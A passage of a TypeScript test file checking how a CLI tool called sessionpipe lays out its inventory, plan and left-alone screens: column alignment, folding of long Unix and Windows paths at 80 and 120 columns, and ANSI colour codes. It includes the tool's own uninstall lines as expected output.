    const lines = found(TTY, inv(copies), facts());
    const whole = found(PLAIN, inv(copies), facts());
    fits(lines, whole);
    // Still one row a copy: the folder beside the release, on the copy's first line.
    expect(whole).toHaveLength(5);
    expect(plain(lines.find((l) => plain(l).includes("_npx")) as string)).toBe(
      "  · 1.2.0      ~/.npm/_npx/0a1b2c3d4e5f6a7b  this command",
    );
    expect(lines.some((l) => plain(l).startsWith("  ✗ left over  ~/.local "))).toBe(true);
  });

  it("at 80 columns an fnm prefix fits: the folder whole on its own line, the rest folded under it", () => {
    const ASDF = "~/.asdf/installs/nodejs/22.11.0";
    const copies = [
      copy(FNM, { version: "1.1.0", uses: ["typed", "service", "hooks"] }),
      NPX,
      copy("/usr/local", { aside: true, version: null, wrong: CUT_OFF }),
      copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN }),
      copy(ASDF, { uses: ["service", "this", "hooks"], wrong: MUTE }),
    ];
    const lines = found(TTY, inv(copies), facts());
    fits(lines, found(PLAIN, inv(copies), facts()));
    expect(lines).toContain(`  ${mark(TTY, "info")} ${FNM}`);
    expect(lines).toContain(`  ${mark(TTY, "bad")} ${ASDF}`);
    // Under each folder: six spaces, then the release and what uses it, on as many lines as it takes.
    const at = lines.indexOf(`  ${mark(TTY, "bad")} ${ASDF}`);
    expect(lines.slice(at + 1)).toEqual([
      "      1.2.0 · the background service, this command, the hooks · it doesn't run:",
      "      `--version` printed nothing",
    ]);
    for (const l of lines.slice(1)) expect(/^ {2}\S|^ {6}\S/.test(plain(l)), plain(l)).toBe(true);
  });

  /** The lines a copy's folder takes at 80 columns, in an inventory where folders have
   *  lines of their own: without the mark and the indent, as the pieces of the path. */
  const pieces = (where: string): string[] => {
    const lines = found(TTY, inv([copy(where), copy(FNM)]), facts()).slice(1);
    const own = lines.slice(
      0,
      lines.findIndex((l) => plain(l).startsWith("      ")),
    );
    // The mark on the first line, in its colour; every further one under the folder's first character.
    expect(own[0]?.startsWith(`  ${mark(TTY, "info")} `), plain(own[0] as string)).toBe(true);
    for (const l of own.slice(1)) expect(l).toMatch(/^ {4}\S/);
    return own.map((l) => plain(l).slice(4));
  };

  it("at 80 columns a folder longer than the line is broken after a separator, and goes on under its first character", () => {
    // A hundred columns of path, ten folders deep.
    const long = `/${Array.from({ length: 10 }, (_, n) => `folder-0${n}`).join("/")}`;
    expect(cols(long)).toBe(100);
    const copies = [copy(long, { uses: ["typed"] }), NPX];
    const lines = found(TTY, inv(copies), facts());
    for (const l of lines) expect(cols(l), plain(l)).toBeLessThan(80);
    expect(lines.slice(1).map(plain)).toEqual([
      "  · /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/folder-06/",
      "    folder-07/folder-08/folder-09",
      "      1.2.0 · you type this",
      "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b",
      "      1.2.0 · this command",
    ]);
    // The pieces give the path back, and it is broken only after a separator.
    expect(pieces(long).join("")).toBe(long);
    expect(pieces(long)).toHaveLength(2);
    expect(pieces(long)[0]).toMatch(/\/$/);
    // Twice the line and more: as many lines as it takes, each full to its last whole folder.
    const longer = `~/${Array.from({ length: 30 }, (_, n) => `folder-${n}`).join("/")}`;
    const parts = pieces(longer);
    expect(parts.length).toBeGreaterThan(3);
    expect(parts.join("")).toBe(longer);
    for (const part of parts.slice(0, -1)) {
      expect(part).toMatch(/\/$/);
      expect(cols(part)).toBeLessThanOrEqual(75);
      expect(cols(part)).toBeGreaterThan(64);
    }
    // Into a pipe the folder is one line, whatever its length.
    expect(found(PLAIN, inv(copies), facts())[1]).toBe(`  · ${long}`);
  });

  it("a folder that just fits the line is whole; one column more and it is broken", () => {
    // The line has 79 columns, four of them the mark's.
    const fits75 = `/${"a".repeat(36)}/${"b".repeat(37)}`;
    expect(cols(fits75)).toBe(75);
    expect(pieces(fits75)).toEqual([fits75]);
    expect(pieces(`${fits75}b`)).toEqual([`/${"a".repeat(36)}/`, "b".repeat(38)]);
  });

  it("a Windows path is broken after a backslash, and a name with spaces in it is never split", () => {
    const win =
      "C:\\Users\\Someone With A Long Name\\AppData\\Roaming\\fnm\\node-versions\\v22.11.0\\installation\\node_modules";
    expect(cols(win)).toBeGreaterThan(79);
    const parts = pieces(win);
    expect(parts).toEqual([
      // 68 columns; the next name would make it 77, and the line has 75.
      "C:\\Users\\Someone With A Long Name\\AppData\\Roaming\\fnm\\node-versions\\",
      "v22.11.0\\installation\\node_modules",
    ]);
    expect(parts.join("")).toBe(win);
    for (const part of parts) expect(cols(part)).toBeLessThanOrEqual(75);
  });

  it("one name longer than the line stays whole: nothing in it can be broken", () => {
    const name = "x".repeat(90);
    // Between two folders: it has a line of its own, which is the one line too long.
    const between = pieces(`~/code/${name}/dist`);
    expect(between).toEqual(["~/code/", `${name}/`, "dist"]);
    // At the start, and with no separator in the whole of it.
    expect(pieces(`${name}/dist`)).toEqual([`${name}/`, "dist"]);
    expect(pieces(name)).toEqual([name]);
    // Every other line of the screen still fits.
    const lines = found(TTY, inv([copy(`~/code/${name}/dist`), copy(FNM)]), facts());
    expect(lines.filter((l) => cols(l) >= 80).map(plain)).toEqual([`    ${name}/`]);
  });
});

describe("usedBy: what uses a copy, in a few words", () => {
  const used = (...uses: Copy["uses"]) => usedBy(copy("~/.local", { uses }));

  it("each use by its own words, several in the order the look gives them, none as that", () => {
    expect(used()).toBe("nothing uses it");
    expect(used("typed")).toBe("you type this");
    expect(used("service")).toBe("the background service");
    expect(used("hooks")).toBe("the hooks");
    expect(used("this")).toBe("this command");
    expect(used("typed", "service", "hooks")).toBe("you type this, the background service, the hooks");
    expect(used("hooks", "service")).toBe("the hooks, the background service");
  });

  it("'this command' is said only of a copy nobody types", () => {
    expect(used("typed", "this")).toBe("you type this");
    expect(used("this", "typed")).toBe("you type this");
    expect(used("typed", "service", "this", "hooks")).toBe("you type this, the background service, the hooks");
    expect(used("service", "this", "hooks")).toBe("the background service, this command, the hooks");
    expect(used("this", "hooks")).toBe("this command, the hooks");
  });

  it("is what the table says of a copy, whatever else the row holds", () => {
    for (const uses of [[], ["typed", "this"], ["service", "this", "hooks"]] as Copy["uses"][]) {
      const c = copy("~/.local", { uses });
      expect(found(PLAIN, inv([c]), facts())[1]).toBe(`  · 1.2.0  ~/.local  ${usedBy(c)}`);
    }
    // What is wrong with a copy does not change what uses it.
    expect(usedBy(copy("~/.local", { uses: ["hooks"], wrong: BROKEN }))).toBe("the hooks");
  });
});

describe("planned: what will happen, a row an action", () => {
  /** One of each kind of row, in the order a plan takes its steps. */
  const EACH: Step[] = [
    FETCH,
    install("1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)"),
    stop("the daemon started by hand (pid 222), once it holds nothing"),
    use("the hooks and the background service to it"),
    remove("/usr/local/bin/sessionpipe (a link to a copy that is gone)"),
    remove("a leftover folder in /usr/local"),
    remove("1.1.0 in ~/.nvm/versions/node/v22.1.0"),
    PROVE,
  ];
  const KEEP = "  = keep     pairings, settings, keys, messages waiting to be sent";

  it("one row per step that says something, in the order they are taken, then what is kept, then what keeps it safe", () => {
    expect(planned(PLAIN, aPlan({ steps: EACH }))).toEqual([
      "This will",
      "  + install  1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)",
      "  ~ stop     the daemon started by hand (pid 222), once it holds nothing",
      "  ~ switch   the hooks and the background service to it",
      "  - remove   /usr/local/bin/sessionpipe (a link to a copy that is gone)",
      "  - remove   a leftover folder in /usr/local",
      "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
      KEEP,
      "",
      SAFE,
    ]);
  });

  it("M3: a home copy that is not installed again is the first row: kept, in the plan's own words for it", () => {
    const stays = "1.2.0 in /usr/local as it is: whole, the newest, and not yours to write";
    const steps = [use("the hooks to it"), remove("1.1.0 in ~/.nvm/versions/node/v22.1.0"), PROVE];
    expect(planned(PLAIN, aPlan({ stays, steps, safety: [RESTARTS] }))).toEqual([
      "This will",
      `  = keep     ${stays}`,
      "  ~ switch   the hooks to it",
      "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
      KEEP,
      "",
      RESTARTS,
    ]);
    // It is a row as what is always kept is one: dim, and folded under its own words.
    const coloured = planned(TTY, aPlan({ stays: `${stays}, as after \`sudo npm install -g\``, steps }));
    expect(coloured.slice(1, 3)).toEqual([
      `  ${tint(TTY, "dim", "= keep   ")}  1.2.0 in /usr/local as it is: whole, the newest, and not yours to`,
      "             write, as after `sudo npm install -g`",
    ]);
    // Without it the first row is the first step's, and with nothing else to do the one row is what is always kept.
    expect(planned(PLAIN, aPlan({ steps }))[1]).toBe("  ~ switch   the hooks to it");
    expect(planned(PLAIN, aPlan({ stays, steps: [PROVE], safety: [] }))).toEqual([
      "This will",
      `  = keep     ${stays}`,
      KEEP,
    ]);
  });

  it("with nothing that keeps a run safe to say, the screen ends with its last row, list or note: no empty line, and no line after it", () => {
    const stays = [left("~/code/sessionpipe", "it holds src")];
    const notes = [
      "The background service isn't running, and nothing here starts it by itself: `sessionpipe control run` does.",
    ];
    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
      expect(planned(ui, aPlan({ safety: [] })).map(plain)).toEqual(["This will", KEEP]);
      // Whatever else is on it: the same screen as with a safety line, less the empty line and that line.
      for (const over of [
        {},
        { left: stays },
        { notes },
        { left: stays, notes },
        { steps: EACH, left: stays, notes },
      ]) {
        const safe = planned(ui, aPlan({ ...over, safety: [SAFE] }));
        expect(safe.slice(-2)).toEqual(["", SAFE]);
        expect(planned(ui, aPlan({ ...over, safety: [] }))).toEqual(safe.slice(0, -2));
      }
    }
  });

  it("the download and the check have no row, nor has a switch with nothing to switch; what is kept is always the last row", () => {
    // A plan of the two steps every plan has: the heading, the one row, the safety line.
    expect(planned(PLAIN, aPlan())).toEqual(["This will", KEEP, "", SAFE]);
    // No agent hooked and nothing running: the step is there, and says nothing.
    const bare = [FETCH, install("1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)"), use(null), PROVE];
    expect(planned(PLAIN, aPlan({ steps: bare }))).toEqual([
      "This will",
      "  + install  1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)",
      KEEP,
      "",
      SAFE,
    ]);
    // With something to switch it is the row after the install.
    expect(planned(PLAIN, aPlan({ steps: [FETCH, use("the hooks to it"), PROVE] }))[1]).toBe(
      "  ~ switch   the hooks to it",
    );
    // No number, no sentence of what happens, and no word of the download or the check.
    for (const l of planned(PLAIN, aPlan({ steps: EACH }))) expect(l).not.toMatch(/^\s*\d+\. |fetched|checked/);
  });

  it("every row starts its words in the same column, whatever its verb", () => {
    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
      const rows = planned(ui, aPlan({ steps: EACH }))
        .map(plain)
        .filter((l) => /^ {2}[+~=-] /.test(l));
      expect(rows).toHaveLength(7);
      // Two spaces, the sign, the verb padded to the longest ("install"), two spaces.
      for (const r of rows) expect(r).toMatch(/^ {2}[+~=-] (install|switch |stop {3}|remove |keep {3}) {2}\S/);
      expect(new Set(rows.map((r) => r.search(/(?<=^ {2}[+~=-] \S+ +)\S/)))).toEqual(new Set([13]));
    }
  });

  it("at a terminal each kind of row has its one colour, on the sign and the verb only; a removal is bold as well", () => {
    const lines = planned(TTY, aPlan({ steps: EACH }));
    expect(lines).toEqual([
      `${ESC}[1mThis will${ESC}[22m`,
      // Green: what is added.
      `  ${ESC}[32m+ install${ESC}[39m  1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)`,
      // Yellow: what is changed in place, a daemon stopped or the hooks and the service switched.
      `  ${ESC}[33m~ stop   ${ESC}[39m  the daemon started by hand (pid 222), once it holds nothing`,
      `  ${ESC}[33m~ switch ${ESC}[39m  the hooks and the background service to it`,
      // Red and bold: what goes. It is the row the eye should land on.
      `  ${ESC}[1m${ESC}[31m- remove ${ESC}[39m${ESC}[22m  /usr/local/bin/sessionpipe (a link to a copy that is gone)`,
      `  ${ESC}[1m${ESC}[31m- remove ${ESC}[39m${ESC}[22m  a leftover folder in /usr/local`,
      `  ${ESC}[1m${ESC}[31m- remove ${ESC}[39m${ESC}[22m  1.1.0 in ~/.nvm/versions/node/v22.1.0`,
      // Dim: what no run touches.
      `  ${ESC}[2m= keep   ${ESC}[22m  pairings, settings, keys, messages waiting to be sent`,
      "",
      // What keeps it safe is plain text: nothing to look for, only to read.
      SAFE,
    ]);
    // The same through the helpers the page is built on, kind by kind.
    const verb = (l: string | undefined): string => {
      const line = l as string;
      return line.slice(2, line.indexOf("m", line.lastIndexOf(ESC)) + 1);
    };
    expect(verb(lines[1])).toBe(tint(TTY, "green", "+ install"));
    expect(verb(lines[2])).toBe(tint(TTY, "yellow", "~ stop   "));
    expect(verb(lines[3])).toBe(tint(TTY, "yellow", "~ switch "));
    expect(verb(lines[4])).toBe(tint(TTY, "bold", tint(TTY, "red", "- remove ")));
    expect(verb(lines[7])).toBe(tint(TTY, "dim", "= keep   "));
    // Each code a row opens it closes before its words begin: the words are in no colour.
    expect(lines.slice(1, 8).map((l) => codes(l).length)).toEqual([2, 2, 2, 4, 4, 4, 2]);
    for (const l of lines.slice(1, 8)) {
      expect(l.slice(2 + verb(l).length)).toMatch(/^ {2}\S/);
      expect(codes(l.slice(2 + verb(l).length))).toEqual([]);
    }
    // Only a removal is bold, and nothing but a removal is red.
    for (const l of lines.slice(1, 8))
      expect([l.includes(`${ESC}[1m`), l.includes(`${ESC}[31m`)]).toEqual(
        plain(l).startsWith("  - remove ") ? [true, true] : [false, false],
      );
  });

  it("without colour, and into a pipe, the sign and the verb say the kind: the same rows, and not one code", () => {
    const whole = planned(
      PLAIN,
      aPlan({ steps: EACH, notes: ["Run `sessionpipe doctor`."], left: [left("~/code", "it holds src")] }),
    );
    expect(whole.join("\n")).not.toContain(ESC);
    // A terminal with colour off (NO_COLOR, TERM=dumb, --no-color) shows the same lines:
    // nothing here is long enough to fold.
    const mono = planned(
      MONO,
      aPlan({ steps: EACH, notes: ["Run `sessionpipe doctor`."], left: [left("~/code", "it holds src")] }),
    );
    expect(mono).toEqual(whole);
    // And colour adds nothing but colour: taken out, a coloured screen is the plain one.
    for (const ui of [TTY, WIDE]) {
      const coloured = planned(
        ui,
        aPlan({ steps: EACH, notes: ["Run `sessionpipe doctor`."], left: [left("~/code", "it holds src")] }),
      );
      expect(coloured.join("\n")).toContain(ESC);
      expect(coloured.map(plain)).toEqual(whole);
    }
    // The four signs are four different characters, and each verb is a word: no row's
    // kind is told by its colour alone.
    const kinds = whole.filter((l) => /^ {2}[+~=-] /.test(l)).map((l) => l.slice(2, 11).trim());
    expect([...new Set(kinds)].sort()).toEqual(["+ install", "- remove", "= keep", "~ stop", "~ switch"]);
    // Into a pipe a line is whole, whatever its length: one fact a line for grep.
    const long = `1.1.0 in /${"deep/".repeat(40)}sessionpipe`;
    expect(planned(PLAIN, aPlan({ steps: [FETCH, remove(long), PROVE] }))[1]).toBe(`  - remove   ${long}`);
  });

  it("at 80 columns and at 120 a row too long for the line folds under its own words, past the sign and the verb", () => {
    const steps = [
      FETCH,
      install("1.2.0, the newest release, fresh in ~/.nvm/versions/node/v22.1.0 (where another copy of it already is)"),
      use("the hooks and the background service to it"),
      PROVE,
    ];
    const whole = planned(PLAIN, aPlan({ steps }));
    expect(planned(MONO, aPlan({ steps }))).toEqual([
      "This will",
      "  + install  1.2.0, the newest release, fresh in ~/.nvm/versions/node/v22.1.0",
      "             (where another copy of it already is)",
      "  ~ switch   the hooks and the background service to it",
      KEEP,
      "",
      SAFE,
    ]);
    // A terminal of 120 columns has 100 for a line: the row folds later, the same way.
    expect(planned(MONO_WIDE, aPlan({ steps }))).toEqual([
      "This will",
      "  + install  1.2.0, the newest release, fresh in ~/.nvm/versions/node/v22.1.0 (where another copy of",
      "             it already is)",
      "  ~ switch   the hooks and the background service to it",
      KEEP,
      "",
      SAFE,
    ]);
    // In colour the lines break at the same words: a colour code takes no column.
    expect(planned(TTY, aPlan({ steps })).map(plain)).toEqual(planned(MONO, aPlan({ steps })));
    expect(planned(WIDE, aPlan({ steps })).map(plain)).toEqual(planned(MONO_WIDE, aPlan({ steps })));
    fits(planned(TTY, aPlan({ steps })), whole, 80);
    fits(planned(WIDE, aPlan({ steps })), whole, 120);
    // The second line of a row carries no sign and no colour: it is its words, under the first.
    const second = planned(TTY, aPlan({ steps }))[2] as string;
    expect(second).toBe("             (where another copy of it already is)");
    expect(cols("  + install  ")).toBe(13);
  });

  /** A hundred columns of folder, ten folders deep. */
  const LONG = `/${Array.from({ length: 10 }, (_, n) => `folder-0${n}`).join("/")}`;

  it("a row whose folder is longer than the line: broken after a separator, each further line under the row's words", () => {
    expect(cols(LONG)).toBe(100);
    const steps = [
      FETCH,
      install(`1.2.0, the newest release, fresh in ${LONG} (replaces 1.1.0)`),
      remove(`${LONG}/bin/sessionpipe (a link to a copy that is gone)`),
      remove(`1.1.0 in ${LONG}`),
      PROVE,
    ];
    const whole = planned(PLAIN, aPlan({ steps }));
    const at80 = planned(MONO, aPlan({ steps }));
    expect(at80).toEqual([
      "This will",
      // The words before the folder keep their line; the folder starts the next one, under them.
      "  + install  1.2.0, the newest release, fresh in",
      "             /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/",
      "             folder-06/folder-07/folder-08/folder-09",
      "             (replaces 1.1.0)",
      // A folder that starts the row starts on the row's own line.
      "  - remove   /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/",
      "             folder-06/folder-07/folder-08/folder-09/bin/sessionpipe",
      "             (a link to a copy that is gone)",
      "  - remove   1.1.0 in",
      "             /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/",
      "             folder-06/folder-07/folder-08/folder-09",
      KEEP,
      "",
      SAFE,
    ]);
    const at120 = planned(MONO_WIDE, aPlan({ steps }));
    expect(at120).toEqual([
      "This will",
      "  + install  1.2.0, the newest release, fresh in",
      "             /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/folder-06/folder-07/",
      "             folder-08/folder-09",
      "             (replaces 1.1.0)",
      "  - remove   /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/folder-06/folder-07/",
      "             folder-08/folder-09/bin/sessionpipe",
      "             (a link to a copy that is gone)",
      "  - remove   1.1.0 in",
      "             /folder-00/folder-01/folder-02/folder-03/folder-04/folder-05/folder-06/folder-07/",
      "             folder-08/folder-09",
      KEEP,
      "",
      SAFE,
    ]);
    for (const [folded, columns] of [
      [at80, 80],
      [at120, 120],
    ] as const) {
      // Every line fits, nothing is lost, and the folder is broken only after a `/`.
      for (const l of folded) expect(cols(l), l).toBeLessThanOrEqual(Math.min(columns - 1, MAX_WIDTH));
      expect(letters(folded)).toBe(letters(whole));
      for (const l of folded.filter((x) => /^ {13}folder-/.test(x)))
        expect(folded[folded.indexOf(l) - 1], l).toMatch(/\/$/);
      // Each further line of a row starts under its first word: thirteen columns in.
      for (const l of folded.filter((x) => x.startsWith("   "))) expect(l).toMatch(/^ {13}\S/);
    }
    // In colour the same lines, the verb's colour on the first line of its row only.
    const coloured = planned(TTY, aPlan({ steps }));
    expect(coloured.map(plain)).toEqual(at80);
    expect(coloured.map((l) => codes(l).length)).toEqual([2, 2, 0, 0, 0, 4, 0, 0, 4, 0, 0, 2, 0, 0]);
    // Into a pipe each row is one line.
    expect(whole).toHaveLength(7);
    expect(whole[2]).toBe(`  - remove   ${LONG}/bin/sessionpipe (a link to a copy that is gone)`);
  });

  it("a Windows folder is broken after a backslash; the pieces give the folder back", () => {
    const win =
      "C:\\Users\\someone\\AppData\\Roaming\\fnm\\node-versions\\v22.11.0\\installation\\node_modules\\sessionpipe";
    expect(cols(win)).toBeGreaterThan(79);
    const steps = [
      FETCH,
      remove(`1.1.0 in ${win}`),
      remove(`${win}\\bin\\sessionpipe.cmd (a link to a copy that is gone)`),
      PROVE,
    ];
    const at80 = planned(MONO, aPlan({ steps }));
    expect(at80.slice(1, 7)).toEqual([
      "  - remove   1.1.0 in",
      "             C:\\Users\\someone\\AppData\\Roaming\\fnm\\node-versions\\v22.11.0\\",
      "             installation\\node_modules\\sessionpipe",
      "  - remove   C:\\Users\\someone\\AppData\\Roaming\\fnm\\node-versions\\v22.11.0\\",
      "             installation\\node_modules\\sessionpipe\\bin\\sessionpipe.cmd",
      "             (a link to a copy that is gone)",
    ]);
    expect(
      at80
        .slice(2, 4)
        .map((l) => l.slice(13))
        .join(""),
    ).toBe(win);
    const at120 = planned(MONO_WIDE, aPlan({ steps }));
    expect(at120.slice(1, 7)).toEqual([
      "  - remove   1.1.0 in",
      "             C:\\Users\\someone\\AppData\\Roaming\\fnm\\node-versions\\v22.11.0\\installation\\node_modules\\",
      "             sessionpipe",
      "  - remove   C:\\Users\\someone\\AppData\\Roaming\\fnm\\node-versions\\v22.11.0\\installation\\node_modules\\",
      "             sessionpipe\\bin\\sessionpipe.cmd",
      "             (a link to a copy that is gone)",
    ]);
    expect(
      at120
        .slice(2, 4)
        .map((l) => l.slice(13))
        .join(""),
    ).toBe(win);
    for (const l of at80) expect(cols(l), l).toBeLessThan(80);
    for (const l of at120) expect(cols(l), l).toBeLessThanOrEqual(100);
    const whole = planned(PLAIN, aPlan({ steps }));
    expect(letters(at80)).toBe(letters(whole));
    expect(letters(at120)).toBe(letters(whole));
  });

  it("a folder that just fits the row is whole; one column more and it is broken", () => {
    // The line has 79 columns, thirteen of them the sign's and the verb's.
    const fits66 = `/${"a".repeat(32)}/${"b".repeat(32)}`;
    expect(cols(fits66)).toBe(66);
    const row = (folder: string) => planned(MONO, aPlan({ steps: [FETCH, remove(folder), PROVE] })).slice(1, -3);
    expect(row(fits66)).toEqual([`  - remove   ${fits66}`]);
    expect(cols(row(fits66)[0] as string)).toBe(79);
    expect(row(`${fits66}b`)).toEqual([`  - remove   /${"a".repeat(32)}/`, `             ${"b".repeat(33)}`]);
    // A hundred at a terminal of 120.
    const wide = (folder: string) => planned(MONO_WIDE, aPlan({ steps: [FETCH, remove(folder), PROVE] })).slice(1, -3);
    const fits87 = `/${"a".repeat(42)}/${"b".repeat(43)}`;
    expect(cols(fits87)).toBe(87);
    expect(wide(fits87)).toEqual([`  - remove   ${fits87}`]);
    expect(wide(`${fits87}b`)).toEqual([`  - remove   /${"a".repeat(42)}/`, `             ${"b".repeat(44)}`]);
  });

  it("one name longer than the line stays whole: nothing in it can be broken, and it is the one line too long", () => {
    const name = "x".repeat(90);
    const lines = planned(MONO, aPlan({ steps: [FETCH, remove(`1.1.0 in ~/code/${name}/dist`), PROVE] }));
    expect(lines.slice(1, 5)).toEqual([
      "  - remove   1.1.0 in",
      "             ~/code/",
      `             ${name}/`,
      "             dist",
    ]);
    expect(lines.filter((l) => cols(l) >= 80)).toEqual([`             ${name}/`]);
    // With no separator in it at all it is one piece.
    expect(planned(MONO, aPlan({ steps: [FETCH, remove(name), PROVE] }))[1]).toBe(`  - remove   ${name}`);
  });

  it("what is left alone, the notes and the safety lines follow the rows, each after an empty line and only where there is any", () => {
    const stays = [left("~/code/sessionpipe", "it holds src")];
    const notes = ["/home/u/.local/bin is not on your PATH: add it, or `sessionpipe` is not found when you type it."];
    const rows = ["This will", KEEP];
    const alone = ["Left alone", "  · ~/code/sessionpipe  it holds src"];
    const noted = [`  ! ${notes[0]}`];
    expect(planned(PLAIN, aPlan())).toEqual([...rows, "", SAFE]);
    expect(planned(PLAIN, aPlan({ left: stays }))).toEqual([...rows, "", ...alone, "", SAFE]);
    expect(planned(PLAIN, aPlan({ notes }))).toEqual([...rows, "", ...noted, "", SAFE]);
    expect(planned(PLAIN, aPlan({ left: stays, notes }))).toEqual([...rows, "", ...alone, "", ...noted, "", SAFE]);
    // Two things that keep it safe are two lines, with nothing between them.
    expect(planned(PLAIN, aPlan({ left: stays, notes, safety: [SAFE, RESTARTS] })).slice(-3)).toEqual([
      "",
      SAFE,
      RESTARTS,
    ]);
    // What is left alone is the function's own rows, as the command prints them by themselves.
    expect(planned(TTY, aPlan({ left: stays }))).toEqual([
      ...planned(TTY, aPlan()).slice(0, 2),
      "",
      ...leftAlone(TTY, stays),
      "",
      SAFE,
    ]);
  });

  it("the notes: each under its mark, a second line under its words, a command shown as one", () => {
    const notes = [
      "/home/u/.local/bin is not on your PATH: add it, or `sessionpipe` is not found when you type it.",
      "Typing `sessionpipe` starts ~/code/sessionpipe, which is no installed copy of it.",
      "The background service isn't running, and nothing here starts it by itself: `sessionpipe control run` does.",
    ];
    // Into a pipe a note is the sentence as the plan wrote it.
    expect(planned(PLAIN, aPlan({ notes })).slice(2)).toEqual(["", ...notes.map((n) => `  ! ${n}`), "", SAFE]);
    expect(planned(MONO, aPlan({ notes })).slice(3, -2)).toEqual([
      "  ! /home/u/.local/bin is not on your PATH: add it, or `sessionpipe` is not",
      "    found when you type it.",
      "  ! Typing `sessionpipe` starts ~/code/sessionpipe, which is no installed copy",
      "    of it.",
      "  ! The background service isn't running, and nothing here starts it by itself:",
      "    `sessionpipe control run` does.",
    ]);
    // At 120 columns only the longest folds, and its command goes whole to the next line.
    expect(planned(MONO_WIDE, aPlan({ notes })).slice(3, -2)).toEqual([
      "  ! /home/u/.local/bin is not on your PATH: add it, or `sessionpipe` is not found when you type it.",
      "  ! Typing `sessionpipe` starts ~/code/sessionpipe, which is no installed copy of it.",
      "  ! The background service isn't running, and nothing here starts it by itself:",
      "    `sessionpipe control run` does.",
    ]);
    // In colour: the mark yellow, each command whole and in its colour, on every line of a note.
    const coloured = planned(TTY, aPlan({ notes })).slice(3, -2);
    expect(coloured).toEqual([
      `  ${mark(TTY, "warn")} /home/u/.local/bin is not on your PATH: add it, or ${tint(TTY, "cyan", "`sessionpipe`")} is not`,
      "    found when you type it.",
      `  ${mark(TTY, "warn")} Typing ${tint(TTY, "cyan", "`sessionpipe`")} starts ~/code/sessionpipe, which is no installed copy`,
      "    of it.",
      `  ${mark(TTY, "warn")} The background service isn't running, and nothing here starts it by itself:`,
      `    ${tint(TTY, "cyan", "`sessionpipe control run`")} does.`,
    ]);
    expect(mark(TTY, "warn")).toBe(`${ESC}[33m!${ESC}[39m`);
    fits(planned(TTY, aPlan({ notes })), planned(PLAIN, aPlan({ notes })), 80);
    fits(planned(WIDE, aPlan({ notes })), planned(PLAIN, aPlan({ notes })), 120);
  });

  it("what keeps it safe is the last of the screen, from the first column, in no colour; a line too long folds to the first column", () => {
    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
      const lines = planned(ui, aPlan({ steps: EACH, safety: [SAFE, RESTARTS] }));
      expect(lines.slice(-3)).toEqual(["", SAFE, RESTARTS]);
    }
    // A release with a long name: the line is longer than 80 columns, and goes on under its own start.
    const long = "Nothing is touched until 10.20.30-beta.12.nightly has been downloaded and seen to run.";
    expect(cols(long)).toBeGreaterThan(79);
    expect(planned(TTY, aPlan({ safety: [long, RESTARTS] })).slice(-4)).toEqual([
      "",
      "Nothing is touched until 10.20.30-beta.12.nightly has been downloaded and seen",
      "to run.",
      RESTARTS,
    ]);
    expect(planned(WIDE, aPlan({ safety: [long, RESTARTS] })).slice(-3)).toEqual(["", long, RESTARTS]);
    expect(planned(PLAIN, aPlan({ safety: [long, RESTARTS] })).slice(-3)).toEqual(["", long, RESTARTS]);
  });

  it("no command is printed on a line of its own: a copy that needs sudo says so, and a run ends with the line", () => {
    const sudo = "sudo rm -r /usr/local/lib/node_modules/sessionpipe /usr/local/bin/sessionpipe";
    const stays = [
      left("/usr/local", "you may not write where it is", { version: "1.1.0", line: sudo, ours: true }),
      left("~/.volta", "Volta keeps it", { line: "volta uninstall sessionpipe" }),
    ];
    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
      const lines = planned(ui, aPlan({ steps: EACH, left: stays })).map(plain);
      expect(lines.join("\n")).not.toMatch(/sudo (rm|npm)|node_modules/);
      expect(lines.join("\n")).not.toContain("This removes it");
      // What its keeper removes it with is said in the row, as words of the sentence.
      expect(lines).toContain("  · ~/.volta    Volta keeps it: `volta uninstall sessionpipe` removes it");
      expect(lines).toContain("  ! /usr/local  1.1.0 · needs sudo: a run ends with its line");
      // And no line of the screen is a command alone.
      for (const l of lines) expect(l).not.toMatch(/^\s+(sudo|npm|volta|sessionpipe)\b/);
    }
  });
});

describe("leftAlone: what stays as it is, a row a thing", () => {
  const SUDO = "sudo rm -r /usr/local/lib/node_modules/sessionpipe /usr/local/bin/sessionpipe";
  /** One of each kind of thing that stays, every place short. */
  const EACH: Left[] = [
    // What is no install of it, and nobody's to remove.
    left("~/code/sessionpipe", CHECKOUT, { version: "1.3.0" }),
    // A copy this command would have removed, with the line that does it.
    left("/usr/local", "you may not write where it is", { version: "1.1.0", line: SUDO, ours: true }),
    // A file of the name that is no install.
    left("/home/u/bin/sessionpipe", "a file npm didn't put there"),
    // What a tool of its own keeps, and removes.
    left("~/.volta", "Volta keeps it", { line: "volta uninstall sessionpipe" }),
    // A folder npm left behind where this user may not write: it would have gone, and names no release.
    left("/opt/node", "you may not write where it is", {
      line: "sudo rm -r /opt/node/lib/node_modules/.sessionpipe-Zz9Yy8Xx",
      ours: true,
    }),
    // npm's cache of what npx ran, beside a clean copy.
    left("~/.npm/_npx/0a1b2c3d4e5f6a7b", "npm's cache of what npx ran", { version: "1.2.0" }),
  ];

  it("nothing left alone is nothing printed: no heading by itself", () => {
    for (const ui of [PLAIN, MONO, TTY, WIDE]) expect(leftAlone(ui, [])).toEqual([]);
  });

  it("each kind of row: where it is, then why; a copy that would have gone is marked, with its release", () => {
    expect(leftAlone(PLAIN, EACH)).toEqual([
      "Left alone",
      // Its release is the table's to say: here, only why it is not touched.
      "  · ~/code/sessionpipe            it holds src, which no published sessionpipe has (a checkout or a build?)",
      // The command is not said here: a run ends with it, once, where it can be copied whole.
      "  ! /usr/local                    1.1.0 · needs sudo: a run ends with its line",
      "  · /home/u/bin/sessionpipe       a file npm didn't put there",
